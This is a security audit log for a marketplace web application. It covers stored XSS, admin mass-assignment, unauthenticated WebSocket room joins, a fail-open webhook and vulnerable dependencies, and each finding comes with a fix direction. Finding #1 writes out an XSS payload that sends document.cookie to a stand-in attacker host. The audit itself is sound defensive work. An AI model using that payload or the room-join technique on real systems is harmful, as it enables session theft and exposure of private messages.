# Security Audit — 2026-09-02

Findings-only log for a future fix PR. No code was changed as part of this audit.

## Scope & method

Targeted code review across two rounds (not a full pentest, no live exploitation against a
running instance).

- **Round 1**: three parallel sub-agent audits (auth/session, input validation/injection,
  API/infra hardening) failed immediately on an account-wide API rate limit — done by hand
  instead. Two items were left explicitly unresolved rather than guessed at: the
  `/auth?redirect=` open-redirect question, and messaging-thread authorization.
- **Round 2**: three more sub-agent audits ran successfully in the background — (1) messaging
  authorization + WebSocket security, (2) a full XSS sweep (~140 `innerHTML`/
  `insertAdjacentHTML` call sites traced back to source) + resolving the open-redirect
  question, (3) mass-assignment/privilege-escalation across every self-service update
  endpoint + admin-route authorization completeness across every `routes/admin*.js` file —
  run in parallel with direct manual checks (SSRF, file upload validation, payment/price
  tampering, account-enumeration timing, 2FA, CSRF token handling).

Both round-1 unresolved items are now resolved (see Verified OK). Treat this as
thorough-but-not-exhaustive even so — a 100+ route-file codebase this size still has corners
neither pass reached, and nothing here was verified by actually exploiting a running instance.

**Known limitation**: this session only has a **shallow git clone** (~78 commits from
2026-08-21 onward). Historical-secret scanning only covers that window. GitGuardian (already
wired into CI on every push — see `.gitguardian.yml`) scans full history on GitHub's side and
has not alerted; that's the stronger signal for anything older.

---

## Findings, most severe first

### 1. [High] Stored XSS in the shortlist drawer via marketplace listing/supplier/package names

- **File**: `public/assets/js/components/shortlist-drawer.js`, `renderItem()` — the
  `alt="${item.name}"` attribute and `<h3 class="shortlist-item-name">${item.name}</h3>`
  element both interpolate `item.name` directly into an `innerHTML` template string with
  **no escaping** (`render()` assigns the result straight to `content.innerHTML`).
- **Confirmed data flow**: `item.name` is populated from fully user-supplied content —
  `public/assets/js/marketplace.js:1228` (`name: listing.title`, a marketplace listing title
  anyone can set when creating a listing), `public/assets/js/pages/package-init.js:344,461`
  (`supplier.name`/`pkg.title`), and `suppliers-init.js`/`marketplace-init.js` (similar).
  None pass the value through escaping before calling `shortlistManager.addItem()`.
- **The escaping convention already exists and is used correctly everywhere else**:
  `marketplace.js` has its own `escapeHtml()` helper and uses it consistently for the exact
  same `listing.title` value in the main listing detail view (lines 510, 518, 553, 570-571,
  575-576) — the shortlist drawer is the one rendering path that was missed.
- **Exploit scenario**: create a listing titled
  `<img src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)>`. Any other
  user who shortlists it and opens their drawer executes the payload. Confirmed via
  `shortlist-manager.js` that shortlist items sync server-side per-user, so this is
  genuinely **stored** — it persists and re-fires until the item is removed.
- **Fix direction**: escape `item.name` (and `item.category`/`item.location`/`priceHint`)
  in `renderItem()` using the same `escapeHtml()` pattern `marketplace.js` already uses, or
  switch to `textContent` assignments for user-controlled fields.

### 2. [High] Unescaped `alt` attribute in the admin marketplace moderation dashboard executes in an admin's session

- **File**: `public/assets/js/pages/admin-marketplace-init.js:146` (loaded by
  `public/admin-marketplace.html`)
- **Detail**:
  ```js
  listing.images && listing.images[0]
    ? `<img src="${listing.images[0]}" alt="${listing.title}" class="listing-image">`
    : '<div class="listing-image"></div>';
  ```
  `listing.title` (attacker-controlled — any user's marketplace listing title) is
  interpolated into the `alt` attribute completely unescaped. Five lines later, in the exact
  same `.map()` callback, the same field is correctly escaped —
  `<h3>${escapeHtml(listing.title)}</h3>` (line 151) — and `description`/`location`/
  `category`/`condition`/`userEmail` are all escaped too (lines 152-160). This one
  interpolation was simply missed. `listing.images[0]` (the `src`) is also unescaped on the
  same line — lower exploitability since URLs don't typically contain quotes, but still
  inconsistent with the rest of the function.
- **Why this is worse than finding #1**: it fires in an **admin's** browser session the
  moment they open the marketplace moderation queue — session/CSRF-token theft or arbitrary
  admin actions, not just another regular user's session.
- **Fix direction**: wrap both interpolations in the same `escapeHtml()` already used five
  lines below.

### 3. [High, no upstream fix] `xlsx` (SheetJS) — two known high-severity CVEs, dependency abandoned on npm

- **File**: `package.json:149` (`"xlsx": "^0.18.5"`), used in export/import features.
- **CVEs**: Prototype Pollution ([GHSA-4r6h-8v6p-xvw6](https://github.com/advisories/GHSA-4r6h-8v6p-xvw6)),
  ReDoS ([GHSA-5pgg-2g8v-p4x9](https://github.com/advisories/GHSA-5pgg-2g8v-p4x9)). `npm audit`
  reports `fixAvailable: false` — SheetJS stopped publishing patched releases to npm.
- **Mitigating factor already in the codebase**: `.env.example` documents
  `DISABLE_XLSX_EXPORT=true` to fall back to CSV in hardened environments — worth confirming
  this is actually set in production, or better, replacing the dependency.
- **Fix direction**: (a) migrate to SheetJS's CDN-distributed patched build, (b) switch to a
  maintained alternative (e.g. `exceljs`), or (c) confirm `DISABLE_XLSX_EXPORT=true` in
  production as the interim mitigation.

### 4. [High, conditional on `WEBSOCKET_MODE=v1`] Legacy WebSocket server has a completely unauthenticated room-join, exposing private message content if active

- **File**: `websocket-server.js:139-142` (`socket.on('join', room => { socket.join(room); ... })`)
- **Detail**: registered unconditionally on every connection — no `socket.userId` check, no
  room-name validation, no ownership lookup. An anonymous socket can
  `emit('join', { room: 'user:<victim-id>' })` immediately after connecting.
- **Why it's exploitable**: `emitToUser()` (`websocket-server.js:274-276`) broadcasts to
  `io.to('user:' + userId)`. `routes/messenger-v4.js`'s `emitToConversation()` helper
  (line 318-333) falls back to per-participant `emitToUser` whenever the active WS server
  lacks an `emitToConversation` method — which v1 does. So on v1, new-message content,
  edits, deletes, reactions, read receipts, and conversation updates for **any** user are
  delivered to whoever occupies `user:<targetId>` — fully attacker-controlled. A second
  instance of the identical bug: `messenger:join` (`websocket-server.js:192-197`) lets any
  socket join `messenger:${conversationId}` the same way.
- **Why conditional, not confirmed-live**: v1 only activates when `WEBSOCKET_MODE=v1` is
  explicitly set — the documented and actual default is `v2` (`.env.example:218`,
  `server.js:1337,1362`). **v2 does not have this bug** — its
  `messenger:v4:join-conversation` handler (`websocket-server-v2.js:174-236`) correctly
  requires `socket.userId` and calls `isConversationParticipant()` (a real MongoDB check,
  fail-closed if the DB isn't attached) before allowing the join. But nothing in CI/lint
  stops `WEBSOCKET_MODE=v1` from being set in any environment, and the code is kept "for
  backwards compatibility" — a live risk to track, not dead code to ignore.
- **Fix direction**: delete `websocket-server.js` (v1) entirely if nothing still needs it,
  or add the same authenticated-participant check v2 already has to its `join` and
  `messenger:join` handlers.

### 5. [Medium] Postmark webhook fails **open** when credentials aren't configured, unlike every other webhook in the app

- **File**: `routes/webhooks.js:46-71` (`POST /api/webhooks/postmark`)
- **Issue**: if `POSTMARK_WEBHOOK_USER`/`POSTMARK_WEBHOOK_PASS` aren't set, the handler logs
  a warning and **falls through and processes the request anyway** (line 68-71, no `return`)
  — even in production. Anyone who finds the endpoint can POST forged `Delivery`/`Bounce`/
  `SpamComplaint`/`SubscriptionChange` events with no auth at all.
- **Why it matters**: forged events could unsubscribe arbitrary real users from email, or
  pollute delivery-health tracking / trigger suppression logic against a victim's address.
- **Inconsistency**: every other webhook fails **closed** — Stripe (`routes/payments.js:309-312`,
  `routes/subscriptions-v2.js:855-856`) and MongoDB Atlas (`webhooks/mongodbWebhookHandler.js:294-301`,
  comment: _"Fail closed in production: never process unsigned webhooks"_) both hard-reject
  with a 400 if their secret is unset. Postmark is the one exception.
- **Fix direction**: mirror the Stripe/MongoDB pattern — reject with 401 in production when
  credentials are unset, warn-and-continue only outside production.

### 6. [Medium] Admin supplier-edit endpoint mass-assigns the entire request body with no allowlist

- **File**: `routes/admin-v2.js:773-820` (`PUT /api/v2/admin/suppliers/:id`, gated by
  `requirePermission(PERMISSIONS.SUPPLIERS_UPDATE)`)
- **Detail**:
  ```js
  const updateData = req.body;
  Object.keys(updateData).forEach(key => {
    if (updateData[key] !== supplier[key]) {
      changes[key] = { before: supplier[key], after: updateData[key] };
      supplier[key] = updateData[key];
    }
  });
  await dbUnified.updateOne('suppliers', { id: supplier.id }, { $set: supplier });
  ```
  No allowlist — any key in the JSON body (`id`, `ownerUserId`, `approved`, `verified`,
  `isPro`, `email`, etc.) is written verbatim. Contrast with the owner-facing PATCH in
  `routes/supplier-management.js`, which explicitly allowlists fields and has a comment
  _"do NOT touch approved here — supplier edits must never revoke approval"_.
- **Why it matters**: reachable by any account holding `SUPPLIERS_UPDATE` (not necessarily
  full admin — see finding #7), it can silently reassign `ownerUserId` (transfer a supplier
  listing to a different account) or desync `id` from the Mongo filter used to find it.
- **Fix direction**: allowlist fields the same way the sibling `/suppliers/:id/approve`,
  `/reject`, `/pro` routes in `routes/admin.js` already do.

### 7. [Medium] A broad `USERS_UPDATE` permission can grant full admin role, bypassing the dedicated `USERS_GRANT_ADMIN` permission

- **Files**: `routes/admin-v2.js:379-419` (`PUT /api/v2/admin/users/:id`, gated by
  `requirePermission(PERMISSIONS.USERS_UPDATE)`); `middleware/permissions.js:18-96`
- **Detail**: the RBAC design has distinct `USERS_GRANT_ADMIN`/`USERS_REVOKE_ADMIN`
  permissions used only by the dedicated grant/revoke endpoints
  (`routes/admin-v2.js:118-121,185-188`). But the much broader `PUT /api/v2/admin/users/:id`
  destructures `{ name, email, role }` from the body and writes `role` as-is with no enum
  validation and no separate permission check:
  ```js
  const { name, email, role } = req.body;
  if (role && role !== user.role) {
    adminUpdates.role = role;
  }
  await dbUnified.updateOne('users', { id }, { $set: adminUpdates });
  ```
  By default only `admin`/`owner` roles carry `USERS_UPDATE` (`moderator`/`support` do not),
  so exploiting this requires an existing admin to have granted `USERS_UPDATE` as a
  `customPermission` to a lesser-privileged account first — but if that ever happens (e.g. a
  support-tier account granted `USERS_UPDATE` for legitimate profile-editing), that account
  can self-escalate straight to `role: 'admin'` (no self-modification guard here, unlike the
  suspend/ban endpoints which explicitly block `user.id === req.user.id`), defeating the
  separation-of-privilege design implied by having a distinct grant-admin permission at all.
- **Fix direction**: reject/ignore `role` changes to `'admin'` on this route unless the
  caller also holds `USERS_GRANT_ADMIN`, or route admin-role changes through the dedicated
  grant/revoke endpoints only. Also validate `role` against the known enum regardless.

### 8. [Moderate] `@sentry/node` + transitive OpenTelemetry instrumentation packages — 19 moderate advisories, fix requires a major bump

- **File**: `package.json:75` (`"@sentry/node": "^8.0.0"`)
- **Detail**: `npm audit` flags 19 moderate advisories across `@opentelemetry/instrumentation-*`,
  `@opentelemetry/core`, `@opentelemetry/resources`, `@sentry/opentelemetry`,
  `@prisma/instrumentation`, all transitive via `@sentry/node`. Fix available but semver-major:
  `@sentry/node@10.73.0`.
- **Fix direction**: schedule a Sentry v8→v10 upgrade (check their migration guide — likely
  touches `utils/sentry.js`/`sentry-browser-init.js`) and re-run `npm audit` to confirm.

### 9. [Low] Legacy pre-migration data files still tracked in git

- **Files**: `data/audit_logs.json`, `messages.json`, `notes.json`, `packages.json`,
  `photos.json`, `reports.json`, `reviews.json`, `search_history.json`, `suppliers.json`,
  `threads.json`
- **Detail**: `.gitignore` excludes `data/*.json` going forward, but these were committed
  before that rule existed. Confirmed by content inspection: synthetic/seed data from the
  pre-MongoDB local file-store era (repeated fake reviewer names, placeholder
  `@supplier.com` emails), **not real customer PII**; `db-unified.js` shows no code path
  still reads this file store.
- **Fix direction**: `git rm --cached data/*.json` (keep `uk-cities.json` and `sample/`,
  explicitly allowlisted as real reference data).

### 10. [Low] CSP `connect-src` (and `img-src`/`media-src`) include a broad `https:` wildcard

- **File**: `middleware/security.js:108-141` (`configureHelmet`)
- **Detail**: `connectSrc` includes `'https:'` alongside the specific allowlisted hosts,
  meaning page JS can `fetch()`/XHR/WebSocket to any HTTPS host. Same on `imgSrc`/`mediaSrc`
  (lower risk — can't execute script or read the response).
- **Why it matters**: doesn't create a vulnerability alone, but weakens CSP as
  defense-in-depth — if an XSS were ever found, injected script could exfiltrate to any
  HTTPS endpoint instead of being blocked.
- **Fix direction**: narrow `connectSrc` to the specific hosts already itemized (Stripe,
  Google, PostHog, Cloudflare, TidyCal) and drop the wildcard, after confirming nothing else
  legitimately needs it.

### 11. [Low] Timing-based account enumeration on `/login` and `/forgot`

- **Files**: `routes/auth.js:606-660` (`POST /login`), `routes/auth.js:1134-1191` (`POST /forgot`)
- **Detail**: both return an identical, generic message regardless of account existence
  (message-content anti-enumeration is done right), but code-path length still differs
  measurably: `/login` skips `bcrypt.compare()` (deliberately slow) entirely for a
  non-existent email; `/forgot` skips a JWT sign + MongoDB write + **awaited Postmark API
  call** for a non-existent email — a much larger, more reliably-measurable gap.
- **Why only Low**: `strictAuthLimiter`/`passwordResetLimiter` (10 and 5 requests per 15 min)
  sharply limit how many timing samples a single-IP attacker can gather.
- **Fix direction**: perform an equivalent-cost dummy operation on the "not found" branch of
  each (e.g. `bcrypt.compare` against a dummy hash; make the `/forgot` email send
  fire-and-forget rather than awaited) so both branches return in comparable time.

### 12. [Low, currently unreachable] `chat:v5:join-conversation` in the default v2 WebSocket server has no auth/ownership check, but the feature is unwired

- **File**: `websocket-server-v2.js:272-280`
- **Detail**: unlike the `messenger:v4:*` handlers nine lines above (which check
  `socket.userId`), this handler joins `chat:v5:<id>` with no authentication and no
  ownership check at all.
- **Why only Low**: no code anywhere in the repo calls the corresponding
  `broadcastMessage`/`broadcastMessageUpdate`/`broadcastMessageDelete`/`broadcastReaction`/
  `broadcastReadReceipt` methods — currently inert. The only live leak is
  `chat:v5:typing-start/stop` (lines 294-321), which _does_ check `socket.userId`, so joining
  only leaks typing-indicator pings (userId + userName), not message content.
- **Fix direction**: add the same auth+ownership guard as `messenger:v4:join-conversation`
  before this is ever wired to real message delivery, or remove the dead handlers.

### 13. [Low] Unescaped image `src` in marketplace listing rendering (URL context, low exploitability)

- **Files**: `public/assets/js/marketplace.js:458`, `public/assets/js/my-marketplace-listings.js:374,411`
- **Detail**: `<img src="${image}" alt="${escapeHtml(title)}" ...>` — `image` (from the
  listing's uploaded photo URLs) is unescaped while the adjacent `alt` on the same line is
  correctly escaped. Low severity since it's a URL/`src` context with no natural
  quote-breakout vector and `img src` doesn't execute `javascript:`, but inconsistent with
  the rest of the function, and server-side validation of the `images` array contents wasn't
  confirmed in this pass.
- **Fix direction**: wrap `image` in `escapeHtml()` defensively, consistent with `alt` on
  the same line.

### 14. [Low/Info] Admin user-edit endpoint accepts an unvalidated `role` string

- **File**: `routes/admin-v2.js:379-419`
- **Detail**: `const { name, email, role } = req.body;` — `role` is written with no enum
  check (`customer`/`supplier`/`admin` not enforced), unlike registration's role coercion
  (`routes/auth.js:299`). Not directly exploitable alone; see finding #7 for the more
  serious implication of this same code path.
- **Fix direction**: validate `role` against the known enum before writing.

### 15. [Info] Registration reveals "Email already registered" (`routes/auth.js:320,324`)

- Standard message-based enumeration on the signup path — a common, debatable industry
  trade-off (many production apps accept this over silently "succeeding" on a duplicate
  email). Flagging for completeness/awareness, not urging a fix.

### 16. [Info, dead code] Two WebSocket gaps worth knowing about before anyone re-wires messaging

- **Legacy `thread`-shaped v2 handlers never check participation**: `handleMessageSend`,
  `handleThreadRead`, `handleReactionSend`, `handleMessageRead`
  (`websocket-server-v2.js:420-501,588-665`) compute recipients from a thread's
  `participants` list without confirming the _sender_ is one of them — if wired up, any
  authenticated user could inject a message into an arbitrary thread. Not currently
  exploitable: `server.js:1386` instantiates v2 with `messagingService` hardcoded `null`
  (comment: "v2 MessagingService has been removed"), and every handler early-returns on
  `!this.messagingService`. Flagging so this isn't silently reactivated without the check.
- **`utils/webSocketMiddleware.js` is entirely orphaned.** It defines a correct
  `isThreadParticipant()` helper (lines 223-255) that nothing in the app actually imports —
  only two unit tests reimplement an equivalent check inline instead. Worth flagging because
  a future engineer could mistake this file's existence for evidence of WS-layer protection
  it doesn't actually provide. Either wire it into v1's handlers (fixing finding #4) or
  delete it to avoid the false sense of coverage.

### 17. [Info, dead code] Two more unescaped-XSS instances, but neither is currently reachable

- **`public/assets/js/components/supplier-card.js`**: the entire `SupplierCard.render()`
  method (lines 380-398) interpolates `supplier.name`/`blurb`/`description_*`/`category`/
  `location`/`price_display`/`phone`/`website` into `innerHTML` with **zero** escaping
  anywhere in the 417-line file. Same bug class as finding #1, worse (no escaping at all).
  However, this class is never instantiated (`grep -rln "new SupplierCard("` and
  `grep -rln "supplier-card.js"` across `public/**/*.html` both return nothing) — the live
  supplier browse/search grid uses the separate, properly-escaped `createSupplierCard()` in
  `pages/suppliers-init.js`.
- **`public/assets/js/conversation-handler.js:204`**: `otherPartyName` (from
  `thread.supplierName`/`recipientName`/`customerName`/etc., all attacker-controllable) is
  interpolated unescaped, while the adjacent message `text` two lines above does get a
  manual `<`/`>` replace. Appears orphaned — no page includes this script (`messages.html`
  is just a meta-refresh stub to `/messenger/`); superseded by the correctly-escaped V4
  messenger stack (`MessageBubbleV4.js`).
- **Fix direction**: delete both files if truly unused, or fix the escaping if either is
  ever revived — don't leave them as a trap for a future re-wiring.

### 18. [Info] Admin homepage collage widget spreads `req.body` (no privilege-escalation impact)

- **File**: `routes/admin-homepage-collage-active.js:196-229` — `{ ...currentWidget,
...req.body, ... }`. Properly gated by `roleRequired('admin')`, and only touches a
  non-user, non-privilege settings blob (`settings.collageWidget`). Flagged only because it
  matched the "spreads whole body" search pattern — not an actual finding.

---

## Verified OK (checked, not skipped — no need to re-check unless something changes nearby)

**Secrets & data exposure**

- No real secrets in tracked files or the available (shallow) git history — searched Stripe/
  AWS/Google/GitHub/Slack/SendGrid key patterns, private key blocks, and MongoDB URIs with
  embedded credentials; every match was a documented placeholder or an obviously-fake test
  value. `.env` is gitignored; only `.env.example` is tracked with no real values.
- GitGuardian is live in CI (`.gitguardian.yml`) with only two narrow, verified-legitimate
  exclusions (fake test creds; one caps-lock-detection false positive).
- No hardcoded API keys in client-side JS — Stripe publishable key fetched at runtime via
  `/api/payments/config`.
- No hardcoded secrets in `railway.json`/`railway.worker.json`/`Procfile`/`.github/workflows/*.yml`
  (all correctly reference `${{ secrets.* }}`); `docker-compose.yml`'s hardcoded Mongo
  password is local-dev-only, production uses `MONGODB_URI` → Atlas.

**Auth, sessions, and account security**

- `JWT_SECRET` fallback (`'change_me'`) is guarded, not exploitable — `server.js:236-249`
  unconditionally `process.exit(1)`s (any environment) if missing/placeholder/under 32
  chars; `middleware/auth.js`/`utils/token.js` add their own production hard-fail checks too.
- Password hashing: bcryptjs, cost factor 10. The one low-cost (4) hash is confined to
  `routes/e2e-test-support.js`'s test-fixture seeding.
- `routes/e2e-test-support.js` is triple-gated, effectively unreachable outside CI:
  `NODE_ENV === 'test'` AND `E2E_MODE === 'full'` to even be mounted, AND a fixed private
  header per request.
- Auth cookies: `httpOnly: true` always, `sameSite: 'lax'`, `secure` correctly gated to
  production.
- Rate limiting on auth is comprehensive across login, 2FA, forgot/reset-password, register,
  email verification, resend-verification, and change-password.
- **2FA (`routes/auth.js:1031-1127`, `routes/twoFactor.js`) is solid**: TOTP secret encrypted
  at rest, backup codes hashed (not plaintext) and single-use (removed after verification),
  reasonable ±60s drift window, rate-limited. The hash comparison (`verifyHash`,
  `utils/encryption.js:130-135`) uses plain `===` rather than a timing-safe compare, but
  since it compares a _hash_ of attacker-controlled input against a stored hash (not a
  direct secret), this isn't a meaningful timing side-channel.
- **CSRF (`middleware/csrf.js`) is a correctly-implemented double-submit-cookie pattern**:
  tokens generated via `crypto.randomBytes(32)` (256 bits), validated on every non-safe
  method, applied consistently across state-changing routes.
- **Open-redirect on `/auth?redirect=...` — resolved, confirmed fine.** The real logic is
  `validateRedirectForRole()` in `public/assets/js/app.js:296-373`, used at login, register,
  and the already-signed-in redirect. It requires the value to start with `/`, re-parses via
  `new URL(url, origin)` and checks `host`/`protocol` equality (blocking protocol-relative
  `//evil.com` and scheme tricks), and further constrains the result to a hardcoded per-role
  path allowlist — a same-origin-but-wrong-role path is rejected too, falling back to a safe
  role-based default. Social-login flows (`auth-google-init.js`, `auth-facebook-init.js`,
  `auth-apple-init.js`) use a lighter but adequate same-origin + no-backslash +
  no-control-character check.
- **Messaging (messenger-v4) REST authorization is correct and consistent.** Every
  read/write path in `services/messenger-v4.service.js` scopes its MongoDB query to the
  requester (`getConversation`, `sendMessage`, `getMessages`, `editMessage`/`deleteMessage`
  sender-only, `toggleReaction`, `markAsRead`/`markAsDelivered`, `searchMessages`). No
  handler uses a vulnerable `{ _id: id }`-only query shape. Admin conversation-viewing
  endpoints correctly gate on `role === 'admin'`. Conversation listing is filtered to the
  caller's own conversations; IDs are non-sequential ObjectIds — no enumeration path found.
  (The one real gap this pass found in messaging is WebSocket-layer, not REST — see #4.)
- WebSocket v2 (the default) correctly authorizes `messenger:v4:join-conversation` via a
  real, fail-closed MongoDB participant check (see finding #4 for contrast with v1).

**Input validation & injection**

- NoSQL injection defense wired globally: `express-mongo-sanitize` via
  `middleware/sanitize.js` → `app.use(configureSanitization())` in `server.js:360`
  (confirmed actually wired, not just present unused in `package.json`), covering
  `req.body`/`query`/`params`, plus a second null-byte-stripping middleware on the same three.
- **File upload validation is genuinely robust** (`utils/uploadValidation.js`): real
  magic-byte content-sniffing via `file-type` (not the spoofable client `Content-Type`), a
  fixed allowlist (JPEG/PNG/WebP/GIF/AVIF/HEIC — **SVG correctly excluded**, closing the
  classic uploaded-SVG-XSS vector), a decompression-bomb pixel-count cap, and EXIF/GPS
  stripping. Minor note: an extension-based fallback exists if magic-byte detection errors,
  but it's still constrained to the same safe allowlist.
- **XSS sweep of ~140 `innerHTML`/`insertAdjacentHTML` sites across `public/assets/js`,
  `public/messenger/js`, `public/supplier/js` found the codebase escapes user content
  correctly almost everywhere it matters** — reviews, the live V4 messenger stack
  (`MessageBubbleV4.js` + friends, which also blocks `javascript:`/`data:` URL schemes via
  `safeUrl()`), community posts/replies (rendered raw but only after server-side DOMPurify
  sanitization at write time — `services/contentSanitizer.js`), the live supplier
  browse/search card (`pages/suppliers-init.js`), wedding RSVP/guest tables, and admin
  ticket/notification views are all consistently escaped. The exceptions found are logged as
  findings #2, #13, and #17 above.
- **SSRF: no exploitable pattern found.** The one outbound-fetch-to-configurable-target route
  (`routes/admin-webhooks-test.js`, admin "test all webhooks" tool) builds its target **only**
  from `process.env.BASE_URL`/hardcoded `localhost:{PORT}` — never request-supplied — with an
  explicit code comment showing this was a deliberate design decision, plus admin+CSRF+audit
  logging. `services/facebookAuth.service.js`'s fetches are hardcoded to Facebook's own host.
- **Subscription pricing can't be tampered with client-side.** `config/billingPlans.js`: the
  client can only select a `planId` from a fixed server-side enum (rejected otherwise); the
  Stripe `priceId` used in checkout is looked up server-side, never accepted from the client.
  Bonus: `normaliseReturnUrl` in the same file already validates Stripe return URLs against
  same-origin — a correct reference implementation, consistent with the `/auth?redirect=`
  finding above.
- **Mass-assignment: 16 of 18 self-service/admin update endpoints checked are correctly
  allowlisted or otherwise safe** — settings, account-type conversion (blocks converting to
  admin), profile, avatar/account deletion (email-confirmation gated), auth profile,
  notification preferences, change-password (requires current password), registration (role
  coerced to customer/supplier only), supplier self-profile edit (explicit allowlist,
  explicit comment protecting `approved`), supplier creation (approval fields server-derived
  only), the previously-vulnerable subscription-upgrade endpoint (comment confirms it now
  re-checks entitlements rather than trusting the client), supplier verification submission,
  supplier availability, partner self-profile, and community self-profile (`communityRole`
  is never client-writable anywhere). The two gaps found are findings #6 and #7 above.

**Admin route authorization**

- **Every `routes/admin*.js` file (plus `supplier-admin.js`, `supplier-trust-admin.js`,
  `system-checks-admin.js`) was checked and is correctly gated** — either via a
  router-level `authRequired, roleRequired('admin')`/`requirePermission(...)` covering every
  route in the file, or consistent per-route guards with no gaps found. The handful of
  routes without an admin check are intentionally-public read-only endpoints (documented as
  such) or the impersonation-stop endpoint, which is correctly gated on a server-set,
  non-forgeable `req.session.originalUser` instead (since the caller's own role legitimately
  changes during impersonation).
- **`routes/admin-debug.js`'s password-reset capability is properly admin-gated
  (`authRequired, roleRequired('admin'), csrfProtection`) and audit-logged**, and the entire
  file is additionally only mounted when `!isProduction && ENABLE_ADMIN_DEBUG_ROUTES === 'true'`
  (`routes/index.js:258-289`) — never mounted in production regardless of the env flag.
- **Role/admin checks are server-authoritative throughout.** `authRequired`
  (`middleware/auth.js:157-224`) re-reads `role` from a fresh DB lookup on every request
  rather than trusting the JWT claim (deliberately, to handle stale JWTs after a role
  change); no admin route reads a role/admin flag from `req.body`/`req.query` (grepped
  confirmed, with the one exception being finding #7's already-covered gap).

**Infra & headers**

- CORS is a real allowlist, not a wildcard (`middleware/security.js:225-326`) — checked
  against `BASE_URL`+`ALLOWED_ORIGINS`+(production only) canonical origins, 403 in
  production for anything else. `credentials: true` is safe here specifically because it's
  paired with this allowlist, not a wildcard.
- Security headers are strong overall: CSP with `frame-ancestors: 'none'`, `object-src: 'none'`,
  `script-src` locked to `'self'` + explicit hosts (two legacy inline scripts pinned by exact
  SHA-256 hash rather than `'unsafe-inline'`), HSTS in production, `X-Frame-Options: deny`,
  `X-Content-Type-Options: nosniff`, path-aware `Permissions-Policy`. See finding #10 for the
  one weak spot.
- HTTPS/canonical-host redirect logic doesn't reflect arbitrary Host headers — only redirects
  to a hardcoded canonical origin, only for known production hosts.
- Stripe and MongoDB Atlas webhooks fail closed in production if their secret is unset (see
  finding #5 for the one webhook that doesn't).

---

## Suggested order of work for the fix PR

1. Fix the two live stored-XSS gaps: `shortlist-drawer.js` (#1) and `admin-marketplace-init.js` (#2) — small, isolated, highest-confidence fixes, do together since they're the same bug class.
2. Fix the admin mass-assignment/privilege-escalation pair: `routes/admin-v2.js` supplier PUT allowlist (#6) and the `USERS_UPDATE`-can-set-role-admin gap (#7) — related, same file, do together.
3. Postmark webhook fail-open (#5) — small, isolated, high-confidence fix.
4. Decide `websocket-server.js` (v1)'s fate (#4) — delete it, or add the participant check. Also fix or delete the two related dead-code WS gaps (#16) while in there.
5. Confirm/set `DISABLE_XLSX_EXPORT=true` in production while evaluating an `xlsx` replacement (#3).
6. Clean up the two dead-code XSS files (#17) — delete or fix, don't leave as a future trap.
7. `git rm --cached` the legacy `data/*.json` files (#9) — trivial, no functional impact.
8. Narrow CSP `connect-src` (#10) — needs manual verification nothing else relies on the wildcard.
9. Fix the low-severity items opportunistically: image `src` escaping (#13), admin role-string validation (#14), account-enumeration timing (#11), `chat:v5` auth guard (#12).
10. Plan the `@sentry/node` v8→v10 upgrade (#8) — larger, needs its own testing pass.
